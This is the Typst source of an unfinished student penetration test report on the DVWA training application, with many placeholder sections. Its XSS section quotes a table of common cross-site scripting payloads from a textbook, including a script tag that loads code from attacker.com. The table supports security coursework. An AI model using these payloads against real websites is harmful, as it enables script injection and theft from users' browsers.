#set document(title: "Company X Penetration Test", author: ("Jani Sourander",))

#import "@preview/gentle-clues:1.3.0": info
#import "theme.typ": theme, severity-badge, issue-table
#show: theme

#align(center)[
  #v(2.5cm)
  #text(size: 22pt, weight: "bold")[Company X Penetration Test]
  #v(-0.25cm)
  #text(size: 12pt)[by Jani Sourander]
  #v(15.6cm)
  #text(size: 11pt)[Start of testing: April 25, 2026]
  #linebreak()
  #text(size: 11pt)[End of testing: #severity-badge("Critical")]
]

#pagebreak()

#outline(indent: 1.6em)

#pagebreak()
#set page(numbering: "1")
#counter(page).update(1)

#heading(level: 1, numbering: none)[Executive Summary]

#info("
This is a copy-pasted guide from Moodle Announcements. TODO: remove before submitting the report.

- primary follow the template suggested (not fully mandatory but the report should be similarly designed in all cases)
- content and length can vary from student to student
- no particular length, however, it is expected on average to be between 10 pages and 20 pages long
- report  should not contain just screenshots, text is a mandatory part, including CVSS scoring (and anything CWE, CVE, CPE related)
- should capture all the Assignments (1-7) you solved
"
)

In this penetration test, Company X was examined for security-relevant weaknesses. The engagement followed a black-box methodology, meaning no internal implementation details were provided in advance. The scope of the assessment was as follows:

- Dedicated web server: 127.0.0.1
  - Domain: https://example.com
    - Subdomains: all subdomains

Table @web-sites contains the overview of examined systems during the penetration test.

#figure(
  table(
    columns: (auto, auto),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
    table.header(
      [*Web Site*], [*Hostname*],
    ),
    [Domain 1], [https://example.com/],
    [Subdomain 1], [https://1.example.com/],
    [Subdomain 2], [https://2.example.com/],
  ),
  caption: [Web sites examined during the penetration test],
) <web-sites>

As a result, several vulnerabilities have been found among the assets of the organization, some of them pose a significant risk. @vulnebility-types summarizes all issues by their type
across all the assets of Company X. Solutions to remedy the discovered vulnerabilities are provided together with detailed descriptions and reproduction steps

#figure(
  image("images/vulns-by-type.png", width: 50%),
  caption: [Vulnerabilities by type],
) <vulnebility-types>

In this part add a short summary of all vulnerabilities in non-technical terms. It's also good to mention an estimation of efforts required to resolve the issues.

#figure(
  table(
    columns: (auto, auto, 1fr, auto),
    align: (center, left, left, left),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#F3F4F6") },
    table.header(
      [*Risk*], [*Asset*], [*Vulnerability*], [*Section*],
    ),
    [#severity-badge("Critical")], [Assignment 1], [Something here], [@assignment-1],
    [#severity-badge("High")], [Assignment 2], [Dunno What Goes here], [@assignment-2],
    [#severity-badge("Medium")], [Assignment 3], [Content needed here too], [@assignment-3],
    [#severity-badge("Low")], [Assignment 4], [todo], [@assignment-4],
  ),
  caption: [Vulnerability overview],
) <vuln-overview>


#counter(heading).update(0)

= Assignment: DVWA XSS

== Overview and Definitions

I used the following sources to complete the DVWA XSS assignment:

- Bug Bounty Bootcamp by Vickie Li (No Starch Press, 2021) Chapter 6: Cross-Site Scripting

The heading has two abbreviations: XSS (Cross-Site Scripting) and CVSS (Common Vulnerability Scoring System). Vickie Li explain XSS as _"An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser."_DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable web application used for security training and testing. It can be found at \url{https://github.com/digininja/DVWA}. Based on the repository README, it seems to run a typical LAMP stack (Linux, Apache, MySQL, PHP). The documentation even points to a YouTube video, where a solution is shown: \url{https://youtu.be/V4MATqtdxss?si=EMHoRvfZz_vI-v14}[Finding and exploiting reflected XSS in DVWA].

Obviously, the KYBS2001 hosted exercise might be hardened somehow so that the exercise is not that trivial. This is essentially the scope of this penetration test experiment. Vickie Li lists a couple of common XSS payloads, which are in the table below.

#figure(
  table(
    columns: (auto, auto),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
    table.header(
      [*Payload*], [*Description*],
    ),
    [`<script>alert(1)</script>`], [Most generic XSS payload],
    [`<iframe src=javascript:alert(1)>`], [Useful when script tags are filtered but iframes are not],
    [`<body onload=alert(1)>`], [Another way to go around the script tag filter],
    [`"><img src=x onerror=prompt(1);>`], [Closes previous tag and inject the code as image error handler],
    [`<script>alert(1)<!–`], [Bypass filters that look for closing script tags],
    [`<a onmouseover"alert(1)">test</a>`], [Trigger XSS on mouseover event],
    [`<script src=//attacker.com/test.js>`], [Run code hosted on attacker's server],
  ),
  caption: [Common XSS payloads],
) <xss-payloads>

According to Li, a good XSS escape test string would be `>'<"//:=;!--`.

== Assignment Solution

TODO

= Assignment: DVWA Command Execution (Injection) <assignment-1>

This section will document the DVWA command execution assignment, including the vulnerable input path, exploitation method, resulting impact, and recommended fixes.

= Assignment: DVWA File Upload <assignment-2>

This section will document the DVWA file upload assignment, including the upload weakness, validation gaps, proof of exploitation, and mitigation steps.

= Assignment: DVWA File Inclusion <assignment-3>

This section will document the DVWA file inclusion assignment, including the affected functionality, inclusion technique, security consequences, and remediation guidance.

= Assignment: DVWA SQL Injection without randomization <assignment-4>

This section will document the DVWA SQL injection assignment without randomization, including the injection point, extraction approach, impact assessment, and defensive measures.

= Assignment: DVWA Brute-Force Login <assignment-5>

This section will document the DVWA brute-force login assignment, including the authentication weakness, attack workflow, impact on account security, and hardening recommendations.

= Assignment: NMAP scan <assignment-6>

This section will document the NMAP scanning assignment, including the scan scope, identified services, notable exposure points, and follow-up observations.

= Extra Activity: Mini-LAB for Pentesting <assignment-extra>

This section will document the Mini-LAB for Pentesting extra activity, including the environment summary, key findings, practical steps performed, and relevant lessons learned.

= Appendices

== Appendix #1 <appendix-1>

Appendix 1.

== Appendix #2 <appendix-2>

Appendix 2.

